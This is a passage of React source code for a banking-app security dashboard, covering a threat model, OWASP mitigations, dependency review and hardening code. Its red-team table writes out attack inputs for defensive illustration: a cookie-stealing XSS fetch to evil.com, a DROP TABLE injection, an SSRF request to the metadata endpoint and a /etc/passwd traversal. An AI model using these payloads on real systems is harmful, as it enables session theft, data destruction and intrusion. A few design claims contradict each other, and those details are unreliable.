import { useState, type ReactNode } from "react";

/* ─────────────────────────────────────────────
   DATA
───────────────────────────────────────────── */

const NAV = [
  { id: "threat",   icon: "⚠️",  short: "Threat Model",       label: "1 · Requirements & Threat Model" },
  { id: "arch",     icon: "🏛️",  short: "Architecture",        label: "2 · Secure Architecture" },
  { id: "deps",     icon: "📦",  short: "Dependencies",        label: "3 · Dependency Security" },
  { id: "impl",     icon: "💻",  short: "Implementation",      label: "4 · Secure Implementation" },
  { id: "sast",     icon: "🧪",  short: "SAST / Testing",      label: "5 · Security Testing (Shift-Left)" },
  { id: "redteam",  icon: "🔴",  short: "Red Team",            label: "6 · Red Team Simulation" },
  { id: "harden",   icon: "🛡️",  short: "Hardening",           label: "7 · Hardening & Residual Risk" },
];

const ASSETS = [
  { name: "Payment Card Data (PAN, CVV, expiry)", tier: "CRITICAL", scope: "PCI-DSS CDE" },
  { name: "Account balances & transaction history", tier: "CRITICAL", scope: "PCI-DSS / GDPR" },
  { name: "Customer PII (name, DOB, NI, address)", tier: "CRITICAL", scope: "GDPR Art.9" },
  { name: "Authentication credentials & MFA seeds", tier: "CRITICAL", scope: "ISO 27001 A.9" },
  { name: "JWT signing keys & refresh tokens", tier: "HIGH",     scope: "ISO 27001 A.10" },
  { name: "Audit logs (tamper-evident)", tier: "HIGH",     scope: "PCI-DSS Req 10" },
  { name: "Internal service-to-service tokens", tier: "HIGH",     scope: "Zero Trust" },
  { name: "Encryption key material (KMS)", tier: "CRITICAL", scope: "PCI-DSS Req 3" },
];

const STRIDE = [
  { cat: "Spoofing",               risk: "CRITICAL", control: "Passkeys (FIDO2) + TOTP MFA. OAuth 2.0 / OIDC via Auth0. Device fingerprinting on new logins." },
  { cat: "Tampering",              risk: "CRITICAL", control: "HMAC-SHA256 signed JWTs (RS256 asymmetric). PostgreSQL row checksums. Immutable audit log." },
  { cat: "Repudiation",            risk: "HIGH",     control: "WORM append-only audit trail (S3 Object Lock). Every state-changing action signed + timestamped." },
  { cat: "Information Disclosure", risk: "CRITICAL", control: "TLS 1.3 only. AES-256-GCM at rest. Field-level encryption for PAN/CVV. No PII in logs." },
  { cat: "Denial of Service",      risk: "HIGH",     control: "Cloudflare WAF + rate limiting. Express rate-limit middleware. Circuit breakers (opossum)." },
  { cat: "Elevation of Privilege", risk: "CRITICAL", control: "Deny-by-default RBAC (Casbin). Separate admin subdomain + PAM. No shared service accounts." },
];

const OWASP = [
  { id:"A01", name:"Broken Access Control",        mit:"RBAC enforced server-side via Casbin. Never trust client-supplied roles. IDOR prevented by ownership checks on every DB query.", status:"MITIGATED" },
  { id:"A02", name:"Cryptographic Failures",       mit:"TLS 1.3 enforced. bcrypt (cost 12) for passwords. AES-256-GCM for PAN/CVV. No MD5 / SHA-1 anywhere in codebase.", status:"MITIGATED" },
  { id:"A03", name:"Injection",                    mit:"pg parameterised queries ($1,$2). No raw string concat in SQL. Joi schema validation rejects unexpected fields.", status:"MITIGATED" },
  { id:"A04", name:"Insecure Design",              mit:"Threat model completed before Sprint 1. Abuse cases defined. Security requirements in Definition of Done.", status:"MITIGATED" },
  { id:"A05", name:"Security Misconfiguration",    mit:"Helmet.js sets all security headers. NODE_ENV=production enforced. Terraform CIS benchmark baseline.", status:"MITIGATED" },
  { id:"A06", name:"Vulnerable Components",        mit:"npm audit in CI (block on high). Snyk SCA gate. Dependabot PRs auto-created. SBOM per release.", status:"MITIGATED" },
  { id:"A07", name:"Auth & Session Failures",      mit:"Access token TTL 15 min. Refresh token rotation on every use. bcrypt + account lockout after 5 failures.", status:"MITIGATED" },
  { id:"A08", name:"Software Integrity Failures",  mit:"npm lockfile committed. Cosign image signing. GitHub OIDC for CI — no static deploy keys.", status:"MITIGATED" },
  { id:"A09", name:"Logging & Monitoring Failures",mit:"Winston structured JSON logs → ELK SIEM. Anomaly detection alerts. PagerDuty on suspicious auth events.", status:"MITIGATED" },
  { id:"A10", name:"SSRF",                         mit:"Allowlist-only outbound HTTP (node-fetch with proxy). Internal IP ranges blocked at egress firewall.", status:"MITIGATED" },
];

const DEPS = [
  { name:"express 4.19",        purpose:"HTTP server",           verdict:"SAFE",   why:"Widely audited. Pinned to latest 4.x. Helmet.js applied.", alt:"Fastify (lower surface area, faster)" },
  { name:"jsonwebtoken 9.x",    purpose:"JWT sign/verify",       verdict:"SAFE",   why:"RS256 only. Algorithm allowlist enforced. No 'none' alg.", alt:"jose (broader IETF compliance)" },
  { name:"bcryptjs 2.x",        purpose:"Password hashing",      verdict:"SAFE",   why:"No native deps. Cost factor 12. No known CVEs.", alt:"argon2 (stronger, OWASP preferred)" },
  { name:"joi 17.x",            purpose:"Input validation",      verdict:"SAFE",   why:"Allowlist schema validation. Strips unknown fields.", alt:"zod (TypeScript-first)" },
  { name:"pg 8.x",              purpose:"PostgreSQL client",     verdict:"SAFE",   why:"Parameterised queries enforced. No known high CVEs.", alt:"N/A — best Node PG client" },
  { name:"helmet 7.x",          purpose:"HTTP security headers", verdict:"SAFE",   why:"Sets CSP, HSTS, X-Frame-Options, nosniff automatically.", alt:"N/A — essential" },
  { name:"express-rate-limit",  purpose:"API rate limiting",     verdict:"SAFE",   why:"Brute-force protection. Redis-backed sliding window.", alt:"nginx rate limiting (ops layer)" },
  { name:"winston 3.x",         purpose:"Structured logging",    verdict:"SAFE",   why:"JSON output. PII redaction filter applied as transport.", alt:"pino (faster, lower overhead)" },
  { name:"node-forge",          purpose:"Crypto / PKI ops",      verdict:"REVIEW", why:"Audit 2023 showed minor issues — mitigated in 1.3.1+. Pin strictly.", alt:"Node.js native crypto (preferred)" },
  { name:"axios",               purpose:"HTTP client",           verdict:"REVIEW", why:"SSRF risk if URLs not validated. Must use allowlist wrapper.", alt:"native fetch (Node 18+, no deps)" },
  { name:"serialize-javascript",purpose:"Safe serialisation",    verdict:"SAFE",   why:"Prevents XSS from JSON embedded in HTML. Actively maintained.", alt:"N/A — purpose-built" },
  { name:"casbin 5.x",          purpose:"RBAC / ABAC engine",    verdict:"SAFE",   why:"Policy-as-code. Deny-by-default. Widely deployed in fintech.", alt:"oso (newer, ABAC-native)" },
];

const CODE = [
  {
    title: "app.js — Express Security Bootstrap (Helmet + Rate Limiting + CORS)",
    code: `// app.js — Security-first Express setup
const express = require('express');
const helmet  = require('helmet');
const rateLimit = require('express-rate-limit');
const cors    = require('cors');

const app = express();

// ── 1. SECURITY HEADERS (Helmet) ──────────────────────────────────────────
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc:  ["'self'"],          // No inline scripts
      styleSrc:   ["'self'"],
      objectSrc:  ["'none'"],          // Block plugins
      frameAncestors: ["'none'"],      // Clickjacking prevention
      upgradeInsecureRequests: [],
    },
  },
  hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
  referrerPolicy: { policy: 'no-referrer' },
}));

// ── 2. CORS — Allowlist only ───────────────────────────────────────────────
const ALLOWED_ORIGINS = process.env.ALLOWED_ORIGINS.split(',');
app.use(cors({
  origin: (origin, cb) => {
    if (!origin || ALLOWED_ORIGINS.includes(origin)) return cb(null, true);
    cb(new Error('CORS: origin not permitted'));
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
}));

// ── 3. RATE LIMITING — Global + per-endpoint ──────────────────────────────
const globalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 200,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Too many requests' },
});

const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,                   // Strict — brute-force protection
  skipSuccessfulRequests: false,
  message: { error: 'Too many login attempts' },
});

app.use(globalLimiter);
app.use('/api/auth', authLimiter);

// ── 4. BODY PARSER — Size limit prevents ReDoS / memory exhaustion ────────
app.use(express.json({ limit: '10kb' }));
app.use(express.urlencoded({ extended: false, limit: '10kb' }));

// ── 5. HIDE FINGERPRINTING INFO ───────────────────────────────────────────
app.disable('x-powered-by');  // helmet already does this, belt-and-suspenders

module.exports = app;`,
  },
  {
    title: "auth.service.js — JWT (RS256) + Refresh Token Rotation",
    code: `// auth.service.js — Asymmetric JWT with refresh rotation
const jwt       = require('jsonwebtoken');
const bcrypt    = require('bcryptjs');
const crypto    = require('crypto');           // Node native — no third-party
const { query } = require('../db/pool');       // pg parameterised wrapper

const ACCESS_TTL  = '15m';                    // Short-lived: 15 minutes
const REFRESH_TTL = '7d';                     // Stored httpOnly cookie

// RS256: private key signs, public key verifies — no secret sharing risk
const PRIVATE_KEY = process.env.JWT_PRIVATE_KEY;  // Loaded from AWS Secrets Manager
const PUBLIC_KEY  = process.env.JWT_PUBLIC_KEY;

// ── SIGN ACCESS TOKEN ─────────────────────────────────────────────────────
function signAccessToken(userId, role) {
  return jwt.sign(
    { sub: userId, role },            // Minimal claims — no PII in token
    PRIVATE_KEY,
    { algorithm: 'RS256', expiresIn: ACCESS_TTL, issuer: 'banking-api' }
  );
}

// ── SIGN REFRESH TOKEN ────────────────────────────────────────────────────
async function issueRefreshToken(userId) {
  const token  = crypto.randomBytes(64).toString('hex'); // 512-bit entropy
  const hashed = crypto.createHash('sha256').update(token).digest('hex');
  const expiry = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000);

  // Store HASHED token — never store raw token in DB
  await query(
    'INSERT INTO refresh_tokens (user_id, token_hash, expires_at) VALUES ($1, $2, $3)',
    [userId, hashed, expiry]
  );
  return token; // Return plaintext only to be set as httpOnly cookie
}

// ── REFRESH: rotate on every use ─────────────────────────────────────────
async function rotateRefreshToken(rawToken) {
  const hashed = crypto.createHash('sha256').update(rawToken).digest('hex');

  const result = await query(
    'DELETE FROM refresh_tokens WHERE token_hash = $1 AND expires_at > NOW() RETURNING user_id',
    [hashed]
  );
  if (result.rowCount === 0) throw new Error('Invalid or expired refresh token');

  const { user_id } = result.rows[0];
  const newRefreshToken = await issueRefreshToken(user_id); // Rotate
  const accessToken     = signAccessToken(user_id, await getUserRole(user_id));

  return { accessToken, newRefreshToken };
}

// ── VERIFY ACCESS TOKEN (algorithm allowlist) ─────────────────────────────
function verifyAccessToken(token) {
  return jwt.verify(token, PUBLIC_KEY, {
    algorithms: ['RS256'],   // NEVER allow 'none' or 'HS256' here
    issuer: 'banking-api',
  });
}

module.exports = { signAccessToken, issueRefreshToken, rotateRefreshToken, verifyAccessToken };`,
  },
  {
    title: "validation.middleware.js — Joi Schema Allowlist Validation",
    code: `// validation.middleware.js — Strict Joi schemas, deny unknown fields
const Joi = require('joi');

// UK IBAN regex (GB + international)
const IBAN_REGEX = /^[A-Z]{2}[0-9]{2}[A-Z0-9 ]{11,30}$/;
const REF_REGEX  = /^[a-zA-Z0-9 .,\\-]{1,140}$/;   // Safe reference chars only

const schemas = {

  // ── Login ─────────────────────────────────────────────────────────────
  login: Joi.object({
    email:    Joi.string().email({ tlds: { allow: false } }).max(254).required(),
    password: Joi.string().min(8).max(128).required(),
    // No extra fields allowed — stripUnknown + allowUnknown: false
  }).options({ allowUnknown: false }),

  // ── Fund Transfer ─────────────────────────────────────────────────────
  transfer: Joi.object({
    sourceAccountId:  Joi.string().uuid({ version: 'uuidv4' }).required(),
    destinationIban:  Joi.string().regex(IBAN_REGEX).required(),
    amount: Joi.number()
      .precision(2)
      .min(0.01)
      .max(50000)              // Single-transfer ceiling
      .required(),
    currency:         Joi.string().valid('GBP','EUR','USD').required(),
    reference:        Joi.string().regex(REF_REGEX).required(),
    idempotencyKey:   Joi.string().uuid({ version: 'uuidv4' }).required(), // Replay prevention
  }).options({ allowUnknown: false }),

  // ── New Payee ─────────────────────────────────────────────────────────
  addPayee: Joi.object({
    name: Joi.string().alphanum().max(100).required(),
    iban: Joi.string().regex(IBAN_REGEX).required(),
  }).options({ allowUnknown: false }),
};

// Factory — returns express middleware for a given schema key
const validate = (schemaKey) => (req, res, next) => {
  const { error, value } = schemas[schemaKey].validate(req.body, { abortEarly: false });
  if (error) {
    // Return generic error — never echo back user input in error messages
    return res.status(400).json({ error: 'Invalid request data' });
  }
  req.body = value;  // Use Joi-stripped value (removes any injected extra fields)
  next();
};

module.exports = { validate };`,
  },
  {
    title: "transfer.service.js — IDOR-Safe Ownership Check + Idempotency",
    code: `// transfer.service.js — Critical: ownership + idempotency + audit
const { query, withTransaction } = require('../db/pool');
const auditLogger = require('../logging/audit');

async function initiateTransfer(payload, authenticatedUserId) {
  const { sourceAccountId, destinationIban, amount, currency, reference, idempotencyKey } = payload;

  // ── 1. IDEMPOTENCY CHECK — prevent replay / double-submit ─────────────
  const existing = await query(
    'SELECT result FROM transfers WHERE idempotency_key = $1',
    [idempotencyKey]
  );
  if (existing.rowCount > 0) return existing.rows[0].result; // Safe replay

  // ── 2. IDOR PREVENTION — re-verify ownership server-side ──────────────
  // Never trust sourceAccountId from client — always join on authenticated user
  const acct = await query(
    'SELECT id, balance, currency FROM accounts WHERE id = $1 AND owner_id = $2 AND is_active = true',
    [sourceAccountId, authenticatedUserId]   // Two-param check: ID + owner
  );
  if (acct.rowCount === 0) {
    // Return 404 not 403 — don't confirm account existence to attacker
    auditLogger.log('TRANSFER_DENIED_IDOR', authenticatedUserId, sourceAccountId, 'FAIL');
    throw Object.assign(new Error('Account not found'), { status: 404 });
  }

  const account = acct.rows[0];

  // ── 3. BUSINESS RULES ─────────────────────────────────────────────────
  if (account.currency !== currency) throw new Error('Currency mismatch');
  if (account.balance.lt(amount))    throw new Error('Insufficient funds');

  // ── 4. ATOMIC TRANSACTION ─────────────────────────────────────────────
  const result = await withTransaction(async (client) => {
    await client.query(
      'UPDATE accounts SET balance = balance - $1 WHERE id = $2',
      [amount, sourceAccountId]
    );
    const transfer = await client.query(
      \`INSERT INTO transfers
         (source_account_id, destination_iban, amount, currency, reference, idempotency_key, status)
       VALUES ($1,$2,$3,$4,$5,$6,'PENDING')
       RETURNING id, created_at\`,
      [sourceAccountId, destinationIban, amount, currency, reference, idempotencyKey]
    );
    return transfer.rows[0];
  });

  // ── 5. IMMUTABLE AUDIT LOG ────────────────────────────────────────────
  auditLogger.log('TRANSFER_INITIATED', authenticatedUserId, result.id, 'SUCCESS', { amount, currency });

  return result;
}

module.exports = { initiateTransfer };`,
  },
  {
    title: "audit.logger.js — HMAC-Signed Immutable Audit Events",
    code: `// audit.logger.js — Tamper-evident, PII-free structured audit events
const crypto  = require('crypto');
const winston = require('winston');

// Signing key loaded from AWS Secrets Manager at startup — never hardcoded
const AUDIT_HMAC_KEY = Buffer.from(process.env.AUDIT_HMAC_KEY_HEX, 'hex');

// Winston transport → ELK (structured JSON) + S3 WORM bucket
const auditTransport = new winston.transports.Http({
  host: process.env.LOGSTASH_HOST,
  ssl: true,
});

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [auditTransport],
  // In production also ships to S3 via separate WORM transport
});

// ── PII SCRUBBER — never log raw PAN, password, or NI number ─────────────
const PII_PATTERNS = [
  /\\b\\d{16}\\b/g,                      // PAN
  /\\b\\d{3}\\b/g,                       // CVV (context-dependent)
  /[A-Z]{2}\\d{6}[A-Z]/g,              // NI number
];

function scrubPii(obj) {
  const str = JSON.stringify(obj);
  return PII_PATTERNS.reduce((s, re) => s.replace(re, '[REDACTED]'), str);
}

// ── SIGN EACH LOG ENTRY — detect tampering ────────────────────────────────
function sign(entry) {
  const payload = JSON.stringify({ ...entry, ts: entry.timestamp });
  return crypto.createHmac('sha256', AUDIT_HMAC_KEY).update(payload).digest('hex');
}

function log(action, userId, resourceId, result, metadata = {}) {
  const entry = {
    timestamp:  new Date().toISOString(),   // Server-side — never client
    action,
    userId,                                  // Pseudonymous UUID — no name/email
    resourceId,
    result,                                  // SUCCESS | FAIL
    metadata:   JSON.parse(scrubPii(metadata)),
  };
  entry.hmac = sign(entry);  // Tamper-evident signature

  logger.info(entry);        // Ships to ELK + WORM S3
}

module.exports = { log };`,
  },
];

const ATTACKS = [
  { name:"JWT Algorithm Confusion (alg:none / HS256 downgrade)",  sev:"CRITICAL", technique:"Craft token with alg:none header, stripped signature", result:"BLOCKED", why:"jsonwebtoken configured with algorithms:['RS256'] allowlist. Any other algorithm throws JsonWebTokenError." },
  { name:"SQL Injection via Transfer Reference Field",             sev:"CRITICAL", technique:"reference='; DROP TABLE transfers;--",               result:"BLOCKED", why:"Joi regex rejects non-alphanumeric chars before reaching DB. pg driver uses $1 parameterised queries — zero concatenation." },
  { name:"IDOR — Read Another Customer's Account Balance",         sev:"CRITICAL", technique:"Tamper accountId UUID in GET /api/accounts/:id",      result:"BLOCKED", why:"Query: WHERE id=$1 AND owner_id=$2. Returns 404 (not 403) — does not confirm account existence." },
  { name:"Brute-Force Login (Credential Stuffing)",                sev:"HIGH",     technique:"Automated: 50,000 email/password combinations",       result:"BLOCKED", why:"express-rate-limit: max 10 auth attempts per 15 min per IP. Account locked after 5 failures. CAPTCHA after attempt 3." },
  { name:"Refresh Token Theft — Replay Old Token",                 sev:"CRITICAL", technique:"Capture refresh token, replay after rotation",        result:"BLOCKED", why:"Token rotation: old token deleted on first use. Replay attempt returns 401. Detection: triggers security alert." },
  { name:"CSRF — Force Victim to Transfer Funds",                  sev:"HIGH",     technique:"Attacker hosts page with hidden form POSTing to /api/transfers",result:"BLOCKED", why:"CORS blocks cross-origin requests. SameSite=Strict cookie. CSRF token double-submit pattern on all state-changing endpoints." },
  { name:"Stored XSS via Payee Name Field",                        sev:"HIGH",     technique:"payeeName: <script>fetch('https://evil.com?c='+document.cookie)</script>",result:"BLOCKED", why:"Joi: alphanum() allowlist rejects HTML. React escapes all output. CSP: script-src 'self' blocks inline. Cookies: HttpOnly." },
  { name:"Privilege Escalation — Inject role:ADMIN into JWT",      sev:"CRITICAL", technique:"Forge JWT claims: {role:'ADMIN'}, re-sign with HS256", result:"BLOCKED", why:"Server fetches role from DB on every request — JWT role claim ignored for authorisation. RS256 signature not forgeable without private key." },
  { name:"SSRF — Internal Metadata Service Exfiltration",          sev:"CRITICAL", technique:"destinationIban replaced with URL: http://169.254.169.254/latest/meta-data/",result:"BLOCKED", why:"Joi IBAN regex rejects URLs entirely. Outbound HTTP client wrapped with allowlist. IMDSv2 enforced at EC2 level." },
  { name:"Mass Assignment — Inject isAdmin:true in Request Body",  sev:"HIGH",     technique:"POST /api/users/profile body: {isAdmin:true,balance:999999}",result:"BLOCKED", why:"Joi schema: allowUnknown:false strips all unrecognised fields before handler. No entity deserialized directly from request." },
  { name:"Path Traversal — Read /etc/passwd via File Download",    sev:"HIGH",     technique:"GET /api/statements?file=../../../../etc/passwd",      result:"BLOCKED", why:"File path never accepted from client. Statement IDs are UUIDs looked up from DB. No filesystem path in any API param." },
  { name:"Denial of Service — JSON Bomb (deeply nested payload)",  sev:"MEDIUM",   technique:"POST body: {a:{a:{a:{...10,000 levels deep}}}}",       result:"BLOCKED", why:"express.json({ limit: '10kb' }) rejects oversized payloads before parsing. Joi validates structure depth." },
];

const COMPLIANCE = [
  { control:"MFA (TOTP + FIDO2 for staff)",       frameworks:["PCI-DSS Req 8.4","ISO 27001 A.9.4","SOC2 CC6.1"], status:"LIVE" },
  { control:"TLS 1.3 — no downgrade",             frameworks:["PCI-DSS Req 4.2.1","SOC2 CC6.7","GDPR Art.32"], status:"LIVE" },
  { control:"AES-256-GCM at rest (PAN/CVV)",      frameworks:["PCI-DSS Req 3.5","GDPR Art.32"], status:"LIVE" },
  { control:"Immutable WORM audit logs",           frameworks:["PCI-DSS Req 10.3","SOC2 CC7.2","ISO 27001 A.12.4"], status:"LIVE" },
  { control:"SAST + SCA gates in CI",             frameworks:["SOC2 CC8.1","ISO 27001 A.14.2"], status:"LIVE" },
  { control:"SBOM generated per build",           frameworks:["PCI-DSS Req 6.3.2","SOC2 CC9.2"], status:"LIVE" },
  { control:"GDPR Right to Erasure workflow",     frameworks:["GDPR Art.17"], status:"LIVE" },
  { control:"Data residency locked to UK/EU",     frameworks:["GDPR Art.44-46"], status:"LIVE" },
  { control:"DAST scan (quarterly)",              frameworks:["PCI-DSS Req 11.3","ISO 27001 A.18.2"], status:"SCHEDULED" },
  { control:"External penetration test (annual)", frameworks:["PCI-DSS Req 11.3.1","SOC2 CC4.1"], status:"SCHEDULED" },
  { control:"Vendor PCI-DSS attestation",         frameworks:["PCI-DSS Req 12.8"], status:"LIVE" },
];

const RESIDUAL = [
  { risk:"Zero-day in Node.js runtime",             likelihood:"LOW",    impact:"CRITICAL", accept:"Vendor advisories monitored. Runtime updated within 24hr of critical CVE. ECR image rescanned on every deploy." },
  { risk:"Insider threat (privileged engineer)",    likelihood:"MEDIUM", impact:"CRITICAL", accept:"CyberArk PAM — just-in-time DB access. All prod access recorded + reviewed. Separation of duties: deploy ≠ access data." },
  { risk:"SIM-swap attack defeating SMS MFA",       likelihood:"MEDIUM", impact:"HIGH",     accept:"FIDO2 hardware keys mandated for staff. Customer TOTP preferred over SMS. Suspicious SIM change triggers account freeze." },
  { risk:"Third-party PSP (Stripe/Modulr) breach",  likelihood:"LOW",    impact:"HIGH",     accept:"Only tokenised card references shared with PSP. PAN never stored server-side. PSP is PCI-DSS Level 1 certified." },
  { risk:"Sophisticated supply-chain attack (npm)", likelihood:"LOW",    impact:"CRITICAL", accept:"npm lockfile committed. Dependabot + Snyk. Private npm mirror with pre-vetted packages. SBOM + Cosign on all images." },
];

/* ─────────────────────────────────────────────
   COLOURS / HELPERS
───────────────────────────────────────────── */
const C = {
  bg:     "#050b14",
  panel:  "#080f1c",
  card:   "#0c1829",
  border: "#162640",
  accent: "#0ea5e9",
  accentDim:"#0369a1",
  text:   "#cbd5e1",
  muted:  "#475569",
  CRITICAL:"#ef4444",
  HIGH:   "#f97316",
  MEDIUM: "#eab308",
  LOW:    "#22c55e",
  LIVE:   "#22c55e",
  SCHEDULED:"#38bdf8",
  SAFE:   "#22c55e",
  "SAFE*":"#eab308",
  REVIEW: "#f97316",
  MITIGATED:"#22c55e",
  BLOCKED:"#22c55e",
  FAILED: "#ef4444",
};

const chip = (label: ReactNode, colorKey: string, small?: boolean) => (
  <span style={{
    display:"inline-block",
    padding: small ? "1px 6px" : "2px 8px",
    borderRadius: 4,
    fontSize: small ? 9 : 10,
    fontWeight: 700,
    letterSpacing: 0.5,
    background: `${C[colorKey] || C.muted}18`,
    color: C[colorKey] || C.muted,
    border: `1px solid ${C[colorKey] || C.muted}33`,
    whiteSpace: "nowrap",
  }}>{label}</span>
);

const Tag = ({ t }) => chip(t, "accent", true);

/* ─────────────────────────────────────────────
   SECTION COMPONENTS
───────────────────────────────────────────── */

function SectionTitle({ icon, title, sub }) {
  return (
    <div style={{ marginBottom: 28, paddingBottom: 18, borderBottom: `1px solid ${C.border}` }}>
      <div style={{ display:"flex", alignItems:"center", gap: 10 }}>
        <span style={{ fontSize: 22 }}>{icon}</span>
        <div>
          <div style={{ fontSize: 17, color:"#e2e8f0", fontWeight: 800, letterSpacing: 0.3 }}>{title}</div>
          <div style={{ fontSize: 11, color: C.muted, marginTop: 3 }}>{sub}</div>
        </div>
      </div>
    </div>
  );
}

function Sub({ children }) {
  return <div style={{ fontSize: 9, color: C.accent, letterSpacing: 3, textTransform:"uppercase", marginBottom: 10, marginTop: 22 }}>{children}</div>;
}

function ThreatSection() {
  return (
    <div>
      <SectionTitle icon="⚠️" title="Requirements & Threat Model"
        sub="Retail Banking · Node.js + React · PCI-DSS · SOC2 · ISO 27001 · GDPR" />

      <Sub>Sensitive Assets & Classification</Sub>
      <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap: 8, marginBottom: 4 }}>
        {ASSETS.map(a => (
          <div key={a.name} style={{ padding:"9px 12px", background: C.card, border:`1px solid ${C.border}`, borderRadius: 6, display:"flex", justifyContent:"space-between", alignItems:"center", gap: 8 }}>
            <span style={{ fontSize: 11, color: C.text }}>{a.name}</span>
            <div style={{ display:"flex", flexDirection:"column", alignItems:"flex-end", gap: 3, flexShrink:0 }}>
              {chip(a.tier, a.tier)}
              <span style={{ fontSize: 9, color: C.muted }}>{a.scope}</span>
            </div>
          </div>
        ))}
      </div>

      <Sub>STRIDE Threat Model</Sub>
      <div style={{ overflowX:"auto" }}>
        <table style={{ width:"100%", borderCollapse:"collapse" }}>
          <thead>
            <tr style={{ borderBottom:`1px solid ${C.border}` }}>
              {["Category","Risk","Security Control"].map(h => (
                <th key={h} style={{ padding:"8px 10px", fontSize:10, color: C.accent, textAlign:"left", letterSpacing:1 }}>{h}</th>
              ))}
            </tr>
          </thead>
          <tbody>
            {STRIDE.map((s,i) => (
              <tr key={i} style={{ borderBottom:`1px solid ${C.panel}` }}>
                <td style={{ padding:"10px 10px", fontSize:12, color:"#e2e8f0", fontWeight:600, whiteSpace:"nowrap" }}>{s.cat}</td>
                <td style={{ padding:"10px 10px" }}>{chip(s.risk, s.risk)}</td>
                <td style={{ padding:"10px 10px", fontSize:11, color: C.muted, lineHeight:1.6 }}>{s.control}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      <Sub>OWASP Top 10 — Mitigation Map</Sub>
      <div style={{ display:"flex", flexDirection:"column", gap: 6 }}>
        {OWASP.map(o => (
          <div key={o.id} style={{ padding:"10px 12px", background: C.card, border:`1px solid ${C.border}`, borderRadius: 6, display:"flex", gap: 10 }}>
            <span style={{ fontSize:10, color: C.accent, fontWeight:700, minWidth:32, paddingTop:1 }}>{o.id}</span>
            <div style={{ flex:1 }}>
              <div style={{ fontSize:12, color:"#e2e8f0", marginBottom:3 }}>{o.name}</div>
              <div style={{ fontSize:11, color: C.muted, lineHeight:1.5 }}>{o.mit}</div>
            </div>
            {chip(o.status, o.status)}
          </div>
        ))}
      </div>
    </div>
  );
}

function ArchSection() {
  const layers = [
    { label:"LAYER 0 — Edge & DDoS",        color:"#ef4444", items:["Cloudflare WAF (OWASP managed ruleset)","Bot management + JS challenge","Rate limit: 200 req/15min global","Geo-blocking (configurable per product"]  },
    { label:"LAYER 1 — TLS Termination",     color:"#f97316", items:["TLS 1.3 only — no 1.2 fallback","HSTS max-age 1yr + preload","Certificate pinning (mobile apps)","OCSP stapling enabled"] },
    { label:"LAYER 2 — API Gateway (Kong)",  color:"#eab308", items:["JWT validation before upstream route","mTLS for all service-to-service","Plugin: request-termination on bad tokens","IP allowlist for admin namespace"] },
    { label:"LAYER 3 — Node.js Services",   color:"#22c55e", items:["Express + Helmet security headers","Joi input validation on every endpoint","Casbin RBAC: deny-by-default","Parameterised pg queries only"] },
    { label:"LAYER 4 — Data (PostgreSQL 16)",color:"#0ea5e9", items:["Row-Level Security (RLS) policies","Field encryption: PAN/CVV (pgcrypto)","WAL audit via pgaudit extension","Encrypted at-rest: AWS RDS + KMS"] },
    { label:"LAYER 5 — Secrets (AWS SM/KMS)",color:"#8b5cf6", items:["No secrets in env vars or code","Rotation every 30 days automated","Envelope encryption for data keys","Break-glass access: audited + alerted"] },
    { label:"LAYER 6 — SIEM & Observability",color:"#ec4899", items:["Winston JSON → Elastic SIEM","ML anomaly detection on auth events","PagerDuty: P1 on fraud signals","WORM S3 audit log (immutable 7yrs)"] },
  ];
  const decisions = [
    { d:"Stateless JWT (RS256, 15 min)",    r:"Asymmetric — public key can verify without exposing signing key. Short TTL limits breach window.", p:"Minimal Exposure" },
    { d:"Zero Trust inter-service (mTLS)",  r:"No implicit VPC trust. Every service authenticates with a certificate. Mutual — both sides verified.", p:"Zero Trust" },
    { d:"Deny-by-Default RBAC (Casbin)",    r:"Policy file defines every allowed action. Missing policy → 403. Audited change process.", p:"Least Privilege" },
    { d:"Refresh Token Rotation",           r:"Old token invalidated on every use. Replay of stolen token detected and triggers account alert.", p:"Defence in Depth" },
    { d:"Separate Admin Subdomain",         r:"admin.bank.com served from isolated infra. Different CORS, stricter rate limits, FIDO2 required.", p:"Isolation" },
    { d:"PAN Tokenisation at Entry",        r:"Raw PAN never stored server-side. Token returned to client. PSP (PCI Level 1) holds card data.", p:"Data Minimisation" },
  ];
  return (
    <div>
      <SectionTitle icon="🏛️" title="Secure Architecture Design" sub="Zero Trust · Defence in Depth · Node.js + React · AWS" />

      <Sub>Defence-in-Depth Layers</Sub>
      <div style={{ display:"flex", flexDirection:"column", gap: 4, marginBottom: 8 }}>
        {layers.map(l => (
          <div key={l.label} style={{ padding:"11px 14px", background: C.card, border:`1px solid ${l.color}22`, borderLeft:`3px solid ${l.color}`, borderRadius: 6 }}>
            <div style={{ fontSize:11, color: l.color, fontWeight:700, marginBottom:6 }}>{l.label}</div>
            <div style={{ display:"flex", flexWrap:"wrap", gap: 5 }}>
              {l.items.map(it => <span key={it} style={{ fontSize:10, padding:"2px 7px", background:`${l.color}10`, border:`1px solid ${l.color}20`, borderRadius:3, color: C.muted }}>{it}</span>)}
            </div>
          </div>
        ))}
      </div>

      <Sub>Security Design Decisions</Sub>
      <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:10 }}>
        {decisions.map(d => (
          <div key={d.d} style={{ padding:"11px 13px", background: C.card, border:`1px solid ${C.border}`, borderRadius:6 }}>
            <div style={{ fontSize:12, color:"#93c5fd", marginBottom:4, fontWeight:600 }}>{d.d}</div>
            <div style={{ fontSize:11, color: C.muted, lineHeight:1.55, marginBottom:6 }}>{d.r}</div>
            <span style={{ fontSize:9, padding:"2px 7px", background:"rgba(14,165,233,0.1)", color: C.accent, border:`1px solid ${C.accentDim}44`, borderRadius:3 }}>{d.p}</span>
          </div>
        ))}
      </div>
    </div>
  );
}

function DepsSection() {
  return (
    <div>
      <SectionTitle icon="📦" title="Dependency Security Review" sub="Node.js Ecosystem · CVE-verified · Supply Chain Controls" />

      <div style={{ padding:"10px 14px", background:`rgba(14,165,233,0.05)`, border:`1px solid rgba(14,165,233,0.15)`, borderRadius:6, fontSize:11, color: C.accent, marginBottom:18 }}>
